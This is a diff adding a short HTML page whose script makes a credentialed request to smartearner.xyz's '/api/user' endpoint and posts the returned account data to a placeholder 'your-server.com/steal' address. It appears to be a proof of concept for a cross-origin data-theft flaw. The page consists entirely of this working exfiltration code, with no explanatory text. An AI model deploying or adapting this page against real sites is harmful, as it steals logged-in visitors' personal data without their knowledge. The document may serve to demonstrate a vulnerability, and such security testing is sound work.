@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<script>
+fetch('https://smartearner.xyz/api/user', {
+  credentials: 'include'
+}).then(r => r.json()).then(data => {
+  fetch('https://your-server.com/steal', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  });
+});
+</script>
